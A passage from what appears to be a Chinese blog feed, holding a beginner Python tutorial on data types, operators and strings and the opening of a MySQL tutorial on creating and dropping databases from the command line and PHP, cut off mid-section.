    <link href="/2020/10/24/python/"/>
    <url>/2020/10/24/python/</url>
    
    <content type="html"><![CDATA[<h1>Python</h1><p>在一些教程中，在Python文件的行首会写上<code>#!/usr/bin/python3</code>它的作用是用来指定Python的解释器，并用只能应用于Linux、Mac等系统中，Windows系统会忽略这个注释。效果等同于<code>#!/usr/bin/env python3</code>其作用就是让env去查找python3的绝对路径替换作为解释器路径。</p><p><a href="#python">Python</a></p><ul><li><a href="#python%E8%A7%A3%E9%87%8A%E5%99%A8">Python解释器</a><ul><li><a href="#%E4%BA%A4%E4%BA%92%E5%BC%8F%E7%BC%96%E7%A8%8B">交互式编程</a></li><li><a href="#%E8%84%9A%E6%9C%AC%E5%BC%8F%E7%BC%96%E7%A8%8B">脚本式编程</a></li></ul></li><li><a href="#%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">基本数据类型</a><ul><li><a href="#%E5%A4%9A%E4%B8%AA%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC">多个变量赋值</a></li></ul></li><li><a href="#%E6%A0%87%E5%87%86%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">标准数据类型</a><ul><li><a href="#number">Number</a></li><li><a href="#string">String</a></li><li><a href="#list">List</a></li><li><a href="#tuple">Tuple</a></li><li><a href="#set">Set</a></li><li><a href="#%E6%B7%BB%E5%8A%A0%E5%85%83%E7%B4%A0">添加元素</a></li><li><a href="#%E7%A7%BB%E9%99%A4%E5%85%83%E7%B4%A0">移除元素</a></li><li><a href="#%E6%B8%85%E7%A9%BA%E9%9B%86%E5%90%88">清空集合</a></li><li><a href="#%E6%97%A0%E9%99%90%E6%9E%81%E5%B5%8C%E5%A5%97">无限极嵌套</a></li></ul></li><li><a href="#python-%E8%BF%90%E7%AE%97%E7%AC%A6">Python 运算符</a><ul><li><a href="#%E6%88%90%E5%91%98%E8%BF%90%E7%AE%97%E7%AC%A6">成员运算符</a></li><li><a href="#%E8%BA%AB%E4%BB%BD%E8%BF%90%E7%AE%97%E7%AC%A6">身份运算符</a></li><li><a href="#%E8%BF%90%E7%AE%97%E7%AC%A6%E4%BC%98%E5%85%88%E7%BA%A7">运算符优先级</a></li></ul></li><li><a href="#%E6%95%B0%E5%AD%97">数字</a><ul><li><a href="#%E6%95%B0%E5%AD%97%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2">数字类型转换</a></li><li><a href="#round%E6%B5%AE%E7%82%B9%E6%95%B0%E5%AD%98%E5%82%A8%E6%9C%89%E7%82%B9%E5%A5%87%E6%80%AA">round（浮点数存储有点奇怪）</a></li><li><a href="#-%E5%92%8C--%E7%9A%84%E4%B8%8D%E5%90%8C"><strong>+=</strong> 和 <strong>=+</strong> 的不同</a></li></ul></li><li><a href="#python-%E5%AD%97%E7%AC%A6%E4%B8%B2">Python 字符串</a><ul><li><a href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9B%B4%E6%96%B0">字符串更新</a></li><li><a href="#%E4%B8%89%E5%BC%95%E5%8F%B7">三引号</a></li></ul></li></ul><h2 id="Python解释器"><a class="header-anchor" href="#Python解释器">🍭</a>Python解释器</h2><h4 id="交互式编程"><a class="header-anchor" href="#交互式编程">🍭</a>交互式编程</h4><p>需要打开 cmd 窗口（命令提示符窗口），在窗口中键入<code>python</code>,回车，进入了交互式编程，此时我们直接输入 python 语句，就可以得到运行的结果。</p><h4 id="脚本式编程"><a class="header-anchor" href="#脚本式编程">🍭</a>脚本式编程</h4><p>先把 python 语句写好，保存在后缀为 .py 的文件里，然后从外部调用这个文件。它也可以使用 cmd 窗口进行调用，<strong>与交互式编程不同的是，不能在cmd窗口内输入python加回车来进入交互模式</strong>。</p><h2 id="基本数据类型"><a class="header-anchor" href="#基本数据类型">🍭</a>基本数据类型</h2><h4 id="多个变量赋值"><a class="header-anchor" href="#多个变量赋值">🍭</a>多个变量赋值</h4><p>python可实现多个变量赋值</p><pre><code class="hljs nix"><span class="hljs-attr">a</span> = <span class="hljs-attr">b</span> = <span class="hljs-attr">c</span> = <span class="hljs-number">1</span></code></pre><p>or</p><pre><code class="hljs apache"><span class="hljs-attribute">a</span>, b, c = <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-string">&quot;blackpink&quot;</span></code></pre><h2 id="标准数据类型"><a class="header-anchor" href="#标准数据类型">🍭</a>标准数据类型</h2><ul><li>**不可变数据（3 个）：**Number（数字）、String（字符串）、Tuple（元组）；</li><li>**可变数据（3 个）：**List（列表）、Dictionary（字典）、Set（集合）。</li></ul><h4 id="Number"><a class="header-anchor" href="#Number">🍭</a>Number</h4><p>有int、float、bool、complex</p><p>type() 函数可以用来查询变量所指的对象类型。</p><pre><code class="hljs haskell">&gt;&gt;&gt; a, b, c, d = <span class="hljs-number">20</span>, <span class="hljs-number">9.5</span>, <span class="hljs-type">True</span>, <span class="hljs-number">5</span>+<span class="hljs-number">6</span>j&gt;&gt;&gt; print(<span class="hljs-class"><span class="hljs-keyword">type</span>(<span class="hljs-title">a</span>), <span class="hljs-keyword">type</span>(<span class="hljs-title">b</span>), <span class="hljs-keyword">type</span>(<span class="hljs-title">c</span>), <span class="hljs-keyword">type</span>(<span class="hljs-title">d</span>))</span>&lt;<span class="hljs-keyword">class</span> &#x27;int&#x27;&gt; &lt;<span class="hljs-keyword">class</span> &#x27;float&#x27;&gt; &lt;<span class="hljs-keyword">class</span> &#x27;bool&#x27;&gt; &lt;<span class="hljs-keyword">class</span> &#x27;complex&#x27;&gt;</code></pre><p>也可用 isinstance 来判断</p><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>&gt; a = <span class="hljs-number">5</span>+<span class="hljs-number">6</span>j<span class="hljs-meta">&gt;&gt;</span>&gt; isinstance(a, int)Flase<span class="hljs-meta">&gt;&gt;</span>&gt;</code></pre><p>数值的除法包含两个运算符：<strong>/</strong> 返回一个浮点数，<strong>//</strong> 返回一个整数。在混合计算时，Python会把整型转换成为浮点数。</p><h4 id="String"><a class="header-anchor" href="#String">🍭</a>String</h4><p>字符串用单引号 <strong>’</strong> 或双引号 <strong>&quot;</strong> 括起来，同时使用反斜杠 \转义特殊字符。</p><p>字符串截取的语法格式如下：</p><pre><code class="hljs css">变量<span class="hljs-selector-attr">[头下标:尾下标]</span></code></pre><p>索引值以 0 为开始值，-1 为从末尾的开始位置。</p><pre><code class="hljs hsp"><span class="hljs-keyword">str</span> = <span class="hljs-string">&#x27;blackpink&#x27;</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">str</span>)          <span class="hljs-meta"># 输出字符串</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">str</span>[<span class="hljs-number">0</span>:<span class="hljs-number">-1</span>])    <span class="hljs-meta"># 输出第一个到倒数第二个的所有字符</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">str</span>[<span class="hljs-number">0</span>])       <span class="hljs-meta"># 输出字符串第一个字符</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">str</span>[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>])     <span class="hljs-meta"># 输出从第三个开始到第五个的字符</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">str</span>[<span class="hljs-number">2</span>:])      <span class="hljs-meta"># 输出从第三个开始的后的所有字符</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">str</span> * <span class="hljs-number">2</span>)      <span class="hljs-meta"># 输出字符串两次，也可以写成 print (<span class="hljs-number">2</span> * str)</span><span class="hljs-keyword">print</span> (<span class="hljs-keyword">str</span> + <span class="hljs-string">&quot;TEST&quot;</span>) <span class="hljs-meta"># 连接字符串</span></code></pre><p>输出如下：</p><pre><code class="hljs mipsasm"><span class="hljs-keyword">blackpink</span><span class="hljs-keyword">blackpin</span><span class="hljs-keyword">b</span><span class="hljs-keyword">ack</span><span class="hljs-keyword">ackpink</span><span class="hljs-keyword">blackpinkblackpink</span><span class="hljs-keyword">blackpinkTEST</span></code></pre><p>Python 使用反斜杠<code> \</code> 转义特殊字符，如不让反斜杠发生转义，可在字符串前面添加一个 <code>r</code>，表示原始字符串,反斜杠<code>\</code>可以作为续行符，表示下一行是上一行的延续;也可以使用 <strong>“”“…”“”</strong> 或者 <strong>‘’‘…’‘’</strong> 跨越多行。</p><h4 id="List"><a class="header-anchor" href="#List">🍭</a>List</h4><p>列表是写在方括号 <strong>[]</strong> 之间用逗号分隔开的元素列表。列表同样可以被索引和截取，列表被截取后返回一个包含所需元素的新列表，语法与string相同。</p><pre><code class="hljs livescript"><span class="hljs-keyword">list</span> = [ <span class="hljs-string">&#x27;abcd&#x27;</span>, <span class="hljs-number">365</span> , <span class="hljs-number">2.83</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>, <span class="hljs-number">89.2</span> ]tinylist = [<span class="hljs-number">123</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>]<span class="hljs-built_in">print</span> (<span class="hljs-keyword">list</span>)            <span class="hljs-comment"># 输出完整列表</span><span class="hljs-built_in">print</span> (<span class="hljs-keyword">list</span>[<span class="hljs-number">0</span>])         <span class="hljs-comment"># 输出列表第一个元素</span><span class="hljs-built_in">print</span> (<span class="hljs-keyword">list</span>[<span class="hljs-number">1</span>:<span class="hljs-number">3</span>])       <span class="hljs-comment"># 从第二个开始输出到第三个元素</span><span class="hljs-built_in">print</span> (<span class="hljs-keyword">list</span>[<span class="hljs-number">2</span>:])        <span class="hljs-comment"># 输出从第三个元素开始的所有元素</span><span class="hljs-built_in">print</span> (tinylist * <span class="hljs-number">2</span>)    <span class="hljs-comment"># 输出两次列表</span><span class="hljs-built_in">print</span> (<span class="hljs-keyword">list</span> + tinylist) <span class="hljs-comment"># 连接列表</span></code></pre><p>输出如下:</p><pre><code class="hljs angelscript">[<span class="hljs-string">&#x27;abcd&#x27;</span>, <span class="hljs-number">365</span>, <span class="hljs-number">2.83</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>, <span class="hljs-number">89.2</span>]abcd[<span class="hljs-number">365</span>, <span class="hljs-number">2.83</span>][<span class="hljs-number">2.83</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>, <span class="hljs-number">89.2</span>][<span class="hljs-number">123</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>, <span class="hljs-number">123</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>][<span class="hljs-string">&#x27;abcd&#x27;</span>, <span class="hljs-number">365</span>, <span class="hljs-number">2.83</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>, <span class="hljs-number">89.2</span>, <span class="hljs-number">123</span>, <span class="hljs-string">&#x27;blackpink&#x27;</span>]</code></pre><p>列表中的元素可以删除</p><pre><code class="hljs applescript">del <span class="hljs-built_in">list</span>[]</code></pre><p>可以变化</p><pre><code class="hljs applescript"><span class="hljs-built_in">list</span>[] = 改变的值</code></pre><p>Python 列表截取可以接收第三个参数，参数作用是截取的步长，以下实例在索引 1 到索引 4 的位置并设置为步长为 2（间隔一个位置）来截取字符串。</p><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>&gt; letters = [<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-string">&#x27;k&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>]<span class="hljs-meta">&gt;&gt;</span>&gt; letters[<span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span>][<span class="hljs-string">&#x27;h&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>]</code></pre><p>如果第三个参数为负数表示逆向读取</p><p>inputWords[-1::-1] 有三个参数， 第一个参数 -1 表示最后一个元素， 第二个参数为空，表示移动到列表末尾，第三个参数为步长，-1 表示逆向。</p><h4 id="Tuple"><a class="header-anchor" href="#Tuple">🍭</a>Tuple</h4><p>tuple的元素不能修改,但可以对元组进行连接组合，</p><pre><code class="hljs smali">tup3 = tup1 + tup2</code></pre><p>元组应写在小括号 <strong>()</strong> 里，元素之间用逗号隔开,元组中的元素类型也可以不相同。</p><p>元组中的元素值是不允许删除的，但我们可以使用del语句来删除整个元组：</p><pre><code class="hljs dos"><span class="hljs-built_in">del</span> tup</code></pre><p>特殊情况:</p><pre><code class="hljs ini"><span class="hljs-attr">tup1</span> = ()    <span class="hljs-comment"># 空元组</span><span class="hljs-attr">tup2</span> = (<span class="hljs-number">20</span>,) <span class="hljs-comment"># 一个元素，需要在元素后添加逗号</span></code></pre><h4 id="Set"><a class="header-anchor" href="#Set">🍭</a>Set</h4><p>使用大括号 <strong>{ }</strong> 或者 <strong>set()</strong> 函数创建集合,<strong>创建一个空集合必须用 <code>set()</code>而不是 <code>&#123; &#125;</code>，因<code>&#123; &#125;</code> 是用来创建一个空字典。</strong></p><pre><code class="hljs bash">b = <span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;blackpink&#x27;</span>)a = <span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;blackpink in your area&#x27;</span>)<span class="hljs-built_in">print</span>(a)<span class="hljs-built_in">print</span>(a - b)     <span class="hljs-comment"># a 和 b 的差集</span><span class="hljs-built_in">print</span>(a | b)     <span class="hljs-comment"># a 和 b 的并集</span><span class="hljs-built_in">print</span>(a &amp; b)     <span class="hljs-comment"># a 和 b 的交集</span><span class="hljs-built_in">print</span>(a ^ b)     <span class="hljs-comment"># a 和 b 中不同时存在的元素</span></code></pre><p>输出如下：</p><pre><code class="hljs 1c">&#123;&#x27;y&#x27;, &#x27;e&#x27;, &#x27;n&#x27;, &#x27;k&#x27;, &#x27;a&#x27;, &#x27;r&#x27;, &#x27;u&#x27;, &#x27;l&#x27;, &#x27;b&#x27;, &#x27;o&#x27;, &#x27; &#x27;, &#x27;c&#x27;, &#x27;p&#x27;, &#x27;i&#x27;&#125;&#123;&#x27;e&#x27;, &#x27;r&#x27;, &#x27;u&#x27;, &#x27;o&#x27;, &#x27; &#x27;, &#x27;y&#x27;&#125;&#123;&#x27;e&#x27;, &#x27;u&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, &#x27;y&#x27;, &#x27;p&#x27;, &#x27;i&#x27;, &#x27;n&#x27;, &#x27;k&#x27;, &#x27;a&#x27;, &#x27;r&#x27;, &#x27;b&#x27;, &#x27; &#x27;, &#x27;c&#x27;&#125;&#123;&#x27;n&#x27;, &#x27;k&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;l&#x27;, &#x27;c&#x27;, &#x27;p&#x27;, &#x27;i&#x27;&#125;&#123;&#x27;y&#x27;, &#x27;e&#x27;, &#x27;r&#x27;, &#x27;u&#x27;, &#x27;o&#x27;, &#x27; &#x27;&#125;</code></pre><h4 id="添加元素"><a class="header-anchor" href="#添加元素">🍭</a>添加元素</h4><p>语法:</p><pre><code class="hljs sas">s.<span class="hljs-meta">add</span>( <span class="hljs-meta">x</span> ) <span class="hljs-meta">or</span> s.u<span class="hljs-meta">pdate(</span> <span class="hljs-meta">x</span> )</code></pre><h4 id="移除元素"><a class="header-anchor" href="#移除元素">🍭</a>移除元素</h4><p>语法:</p><pre><code class="hljs sas">s.<span class="hljs-meta">remove</span>( <span class="hljs-meta">x</span> ) <span class="hljs-meta">or</span> s.discard( <span class="hljs-meta">x</span> )</code></pre><h4 id="清空集合"><a class="header-anchor" href="#清空集合">🍭</a>清空集合</h4><p>语法:</p><pre><code class="hljs arduino">s.<span class="hljs-built_in">clear</span>()</code></pre><p>字典是一种映射类型，字典用 <strong>{ }</strong> 标识，它是一个无序的 <strong>键(key) : 值(value)</strong> 的集合。键(key)必须使用不可变类型。在同一个字典中，键(key)必须是唯一的，值则不用。</p><p>删除：</p><pre><code class="hljs mipsasm">del <span class="hljs-keyword">dict[&#x27;Name&#x27;] </span><span class="hljs-comment"># 删除键 &#x27;Name&#x27;</span><span class="hljs-keyword">dict.clear() </span>    <span class="hljs-comment"># 清空字典</span>del <span class="hljs-keyword">dict </span>        <span class="hljs-comment"># 删除字典</span></code></pre><p><strong>不允许同一个键出现两次。创建时如果同一个键被赋值两次，后一个值会被记住</strong></p><h4 id="无限极嵌套"><a class="header-anchor" href="#无限极嵌套">🍭</a>无限极嵌套</h4><p>查询语法：</p><pre><code class="hljs isbl"><span class="hljs-variable">for</span> <span class="hljs-variable">i</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> 类别[<span class="hljs-string">&#x27;&#x27;</span>]:    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-variable">i</span>)</span></code></pre><h2 id="Python-运算符"><a class="header-anchor" href="#Python-运算符">🍭</a>Python 运算符</h2><h4 id="成员运算符"><a class="header-anchor" href="#成员运算符">🍭</a>成员运算符</h4><table><thead><tr><th style="text-align:left">运算符</th><th style="text-align:left">描述</th><th style="text-align:center">实例</th></tr></thead><tbody><tr><td style="text-align:left">in</td><td style="text-align:left">如果在指定的序列中找到值返回 True，否则返回 False。</td><td style="text-align:center">x 在 y 序列中 , 如果 x 在 y 序列中返回 True。</td></tr><tr><td style="text-align:left">not in</td><td style="text-align:left">如果在指定的序列中没有找到值返回 True，否则返回 False。</td><td style="text-align:center">x 不在 y 序列中 , 如果 x 不在 y 序列中返回 True。</td></tr></tbody></table><h4 id="身份运算符"><a class="header-anchor" href="#身份运算符">🍭</a>身份运算符</h4><table><thead><tr><th style="text-align:left">运算符</th><th style="text-align:left">描述</th><th style="text-align:left">实例</th></tr></thead><tbody><tr><td style="text-align:left">is</td><td style="text-align:left">is 是判断两个标识符是不是引用自一个对象</td><td style="text-align:left"><strong>x is y</strong>, 类似 <strong>id(x) == id(y)</strong> , 如果引用的是同一个对象则返回 True，否则返回 False</td></tr><tr><td style="text-align:left">is not</td><td style="text-align:left">is not 是判断两个标识符是不是引用自不同对象</td><td style="text-align:left"><strong>x is not y</strong> ， 类似 <strong>id(a) != id(b)</strong>。如果引用的不是同一个对象则返回结果 True，否则返回 False。</td></tr></tbody></table><h4 id="运算符优先级"><a class="header-anchor" href="#运算符优先级">🍭</a>运算符优先级</h4><table><thead><tr><th style="text-align:left">运算符</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">**</td><td style="text-align:left">指数 (最高优先级)</td></tr><tr><td style="text-align:left">~ + -</td><td style="text-align:left">按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@)</td></tr><tr><td style="text-align:left">* / % //</td><td style="text-align:left">乘，除，求余数和取整除</td></tr><tr><td style="text-align:left">+ -</td><td style="text-align:left">加法减法</td></tr><tr><td style="text-align:left">&gt;&gt; &lt;&lt;</td><td style="text-align:left">右移，左移运算符</td></tr><tr><td style="text-align:left">&amp;</td><td style="text-align:left">位 ‘AND’</td></tr><tr><td style="text-align:left">^ |</td><td style="text-align:left">位运算符</td></tr><tr><td style="text-align:left">&lt;= &lt; &gt; &gt;=</td><td style="text-align:left">比较运算符</td></tr><tr><td style="text-align:left">== !=</td><td style="text-align:left">等于运算符</td></tr><tr><td style="text-align:left">= %= /= //= -= += *= **=</td><td style="text-align:left">赋值运算符</td></tr><tr><td style="text-align:left">is is not</td><td style="text-align:left">身份运算符</td></tr><tr><td style="text-align:left">in not in</td><td style="text-align:left">成员运算符</td></tr><tr><td style="text-align:left">not and or</td><td style="text-align:left">逻辑运算符</td></tr></tbody></table><h2 id="数字"><a class="header-anchor" href="#数字">🍭</a>数字</h2><h4 id="数字类型转换"><a class="header-anchor" href="#数字类型转换">🍭</a>数字类型转换</h4><ul><li><strong>int(x)</strong> 将x转换为一个整数。</li><li><strong>float(x)</strong> 将x转换到一个浮点数。</li><li><strong>complex(x)</strong> 将x转换到一个复数，实数部分为 x，虚数部分为 0。</li><li><strong>complex(x, y)</strong> 将 x 和 y 转换到一个复数，实数部分为 x，虚数部分为 y。x 和 y 是数字表达式。</li></ul><p>在整数除法中，除法 <strong>/</strong> 总是返回一个浮点数，如果只想得到整数的结果，丢弃可能的分数部分，可以使用运算符 <strong>//</strong> 。但**//** 得到的并不一定是整数类型的数，它与分母分子的数据类型有关系。</p><h4 id="round（浮点数存储有点奇怪）"><a class="header-anchor" href="#round（浮点数存储有点奇怪）">🍭</a>round（浮点数存储有点奇怪）</h4><pre><code class="hljs gauss"><span class="hljs-keyword">print</span>(<span class="hljs-built_in">round</span>(<span class="hljs-number">10.4</span>)) <span class="hljs-meta">#10</span><span class="hljs-keyword">print</span>(<span class="hljs-built_in">round</span>(<span class="hljs-number">10.5</span>)) <span class="hljs-meta">#10</span><span class="hljs-keyword">print</span>(<span class="hljs-built_in">round</span>(<span class="hljs-number">10.6</span>)) <span class="hljs-meta">#11</span></code></pre><p>当个位为奇数，小数部分&gt;=0.5入，其余为舍;当个位为偶数，小数部分&gt;0.5入，其余为舍。</p><h4 id="和-的不同"><a class="header-anchor" href="#和-的不同">🍭</a><strong>+=</strong> 和 <strong>=+</strong> 的不同</h4><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>&gt; a = <span class="hljs-number">5</span><span class="hljs-meta">&gt;&gt;</span>&gt; a += <span class="hljs-number">6</span> <span class="hljs-comment">#与a=a+6效果相同</span><span class="hljs-meta">&gt;&gt;</span>&gt; a<span class="hljs-number">11</span></code></pre><p>对比</p><pre><code class="hljs angelscript">&gt;&gt;&gt; b = +<span class="hljs-number">6</span>  # 其实就是正数，是一个赋值操作，+ <span class="hljs-number">6</span> 即为 +<span class="hljs-number">6</span>，+<span class="hljs-number">6</span> 为 <span class="hljs-number">6</span></code></pre><h2 id="Python-字符串"><a class="header-anchor" href="#Python-字符串">🍭</a>Python 字符串</h2><h4 id="字符串更新"><a class="header-anchor" href="#字符串更新">🍭</a>字符串更新</h4><pre><code class="hljs routeros">var1 = <span class="hljs-string">&#x27;Hello world!&#x27;</span> <span class="hljs-builtin-name">print</span> (<span class="hljs-string">&quot;已更新字符串 : &quot;</span>, var1[:6] + <span class="hljs-string">&#x27;blackpink!&#x27;</span>)</code></pre><p>输出如下：</p><pre><code class="hljs ada">已更新字符串 :  <span class="hljs-type">Hello</span> blackpink!</code></pre><h4 id="三引号"><a class="header-anchor" href="#三引号">🍭</a>三引号</h4><p>允许一个字符串跨多行，字符串中可以包含换行符、制表符以及其他特殊字符。</p><pre><code class="hljs python">para_str = <span class="hljs-string">&quot;&quot;&quot;心如花木</span><span class="hljs-string">向阳而生</span><span class="hljs-string">TAB ( \t )</span><span class="hljs-string">也可以使用换行符 [ \n ]</span><span class="hljs-string">&quot;&quot;&quot;</span><span class="hljs-keyword">print</span> (para_str)</code></pre><p>输出如下：</p><pre><code class="hljs less">心如花木向阳而生<span class="hljs-selector-tag">TAB</span> (  )也可以使用换行符 <span class="hljs-selector-attr">[ </span><span class="hljs-selector-attr"> ]</span></code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>MYSQL</title>
    <link href="/2020/10/18/MYSQL/"/>
    <url>/2020/10/18/MYSQL/</url>
    
    <content type="html"><![CDATA[<h1>MySQL</h1><ul><li><a href="#mysql">MySQL</a><ul><li><a href="#mysql%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93">MySQL创建数据库</a><ul><li><a href="#%E4%BD%BF%E7%94%A8-mysqladmin-%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93">使用 mysqladmin 创建数据库</a></li><li><a href="#%E4%BD%BF%E7%94%A8-php%E8%84%9A%E6%9C%AC-%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%BA%93">使用 PHP脚本 创建数据库</a></li></ul></li><li><a href="#mysql-%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E5%BA%93">MySQL 删除数据库</a><ul><li><a href="#drop-%E5%91%BD%E4%BB%A4%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E5%BA%93">drop 命令删除数据库</a></li><li><a href="#%E4%BD%BF%E7%94%A8-mysqladmin-%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E5%BA%93">使用 mysqladmin 删除数据库</a></li><li><a href="#%E4%BD%BF%E7%94%A8php%E8%84%9A%E6%9C%AC%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E5%BA%93">使用PHP脚本删除数据库</a></li></ul></li><li><a href="#mysql-%E9%80%89%E6%8B%A9%E6%95%B0%E6%8D%AE%E5%BA%93">MySQL 选择数据库</a><ul><li><a href="#%E4%BB%8E%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AA%97%E5%8F%A3%E4%B8%AD%E9%80%89%E6%8B%A9">从命令提示窗口中选择</a></li><li><a href="#%E4%BD%BF%E7%94%A8php%E8%84%9A%E6%9C%AC">使用PHP脚本</a></li></ul></li><li><a href="#mysql-%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E8%A1%A8">MySQL 创建数据表</a><ul><li><a href="#%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E5%88%9B%E5%BB%BA%E8%A1%A8">使用命令提示符创建表</a></li><li><a href="#%E4%BD%BF%E7%94%A8php%E8%84%9A%E6%9C%AC%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E8%A1%A8">使用PHP脚本创建数据表</a></li></ul></li><li><a href="#mysql-%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE%E8%A1%A8">MySQL 删除数据表</a></li><li><a href="#mysql-%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE">MySQL 删除数据</a></li><li><a href="#mysql-%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE">MySQL 查询数据</a><ul><li><a href="#%E9%80%9A%E8%BF%87%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6">通过命令提示符</a></li><li><a href="#%E4%BD%BF%E7%94%A8php%E8%84%9A%E6%9C%AC-1">使用PHP脚本</a></li></ul></li><li><a href="#mysql-%E6%8F%92%E5%85%A5%E6%95%B0%E6%8D%AE">MySQL 插入数据</a><ul><li><a href="#%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AA%97%E5%8F%A3">命令提示窗口</a></li></ul></li><li><a href="#mysql%E6%94%B9%E6%95%B0%E6%8D%AE">MySQL改数据</a><br>数据库是按照数据结构来组织、存储和管理数据的仓库。每个数据库都有一个或多个不同的 API 用于创建，访问，管理，搜索和复制所保存的数据。</li></ul></li></ul><p>关系数据库管理系统的特点：</p><ul><li>1.数据以表格的形式出现</li><li>2.每行为各种记录名称</li><li>3.每列为记录名称所对应的数据域</li><li>4.许多的行和列组成一张表单</li><li>5.若干的表单组成database</li></ul><h2 id="MySQL创建数据库"><a class="header-anchor" href="#MySQL创建数据库">🍭</a>MySQL创建数据库</h2><p>简单命令如下：数据名为BLACKPINK</p><pre><code class="hljs autoit">[root<span class="hljs-symbol">@host]</span><span class="hljs-meta"># mysql -u root -p   </span>Enter password:******  <span class="hljs-meta"># 登录后进入终端</span>mysql&gt; create DATABASE BLACKPINK<span class="hljs-comment">;</span></code></pre><h4 id="使用-mysqladmin-创建数据库"><a class="header-anchor" href="#使用-mysqladmin-创建数据库">🍭</a>使用 mysqladmin 创建数据库</h4><p>root用户拥有最高权限，可以使用 mysql <strong>mysqladmin</strong> 命令来创建数据库。</p><pre><code class="hljs autoit">[root<span class="hljs-symbol">@host]</span><span class="hljs-meta"># mysqladmin -u root -p create BLACKPINK</span>Enter password:******</code></pre><p>上述命令创建 MySQL 数据库 BLACKPINK。</p><h4 id="使用-PHP脚本-创建数据库"><a class="header-anchor" href="#使用-PHP脚本-创建数据库">🍭</a>使用 PHP脚本 创建数据库</h4><p>PHP 使用 mysqli_query 函数来创建或者删除 MySQL 数据库。</p><p>语法:</p><pre><code class="hljs reasonml">mysqli<span class="hljs-constructor">_query(<span class="hljs-params">connection</span>,<span class="hljs-params">query</span>,<span class="hljs-params">resultmode</span>)</span>;</code></pre><p>实例：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$dbhost = <span class="hljs-string">&#x27;localhost&#x27;</span>;  <span class="hljs-comment">// mysql服务器主机地址</span>$dbuser = <span class="hljs-string">&#x27;root&#x27;</span>;            <span class="hljs-comment">// mysql用户名</span>$dbpass = <span class="hljs-string">&#x27;123456&#x27;</span>;          <span class="hljs-comment">// mysql用户名密码</span>$conn = mysqli_connect($dbhost, $dbuser, $dbpass);<span class="hljs-keyword">if</span>(! $conn )&#123;  <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;连接错误: &#x27;</span> . mysqli_error($conn));&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;连接成功&lt;br /&gt;&#x27;</span>;$sql = <span class="hljs-string">&#x27;CREATE DATABASE BLACKPINK&#x27;</span>;$retval = mysqli_query($conn,$sql );<span class="hljs-keyword">if</span>(! $retval )&#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;创建数据库失败: &#x27;</span> . mysqli_error($conn));&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;数据库 BLACKPINK 创建成功\n&quot;</span>;mysqli_close($conn);<span class="hljs-meta">?&gt;</span></code></pre><h2 id="MySQL-删除数据库"><a class="header-anchor" href="#MySQL-删除数据库">🍭</a>MySQL 删除数据库</h2><h4 id="drop-命令删除数据库"><a class="header-anchor" href="#drop-命令删除数据库">🍭</a>drop 命令删除数据库</h4><p>语法如下:</p><pre><code class="hljs n1ql">mysql&gt; <span class="hljs-keyword">drop</span> <span 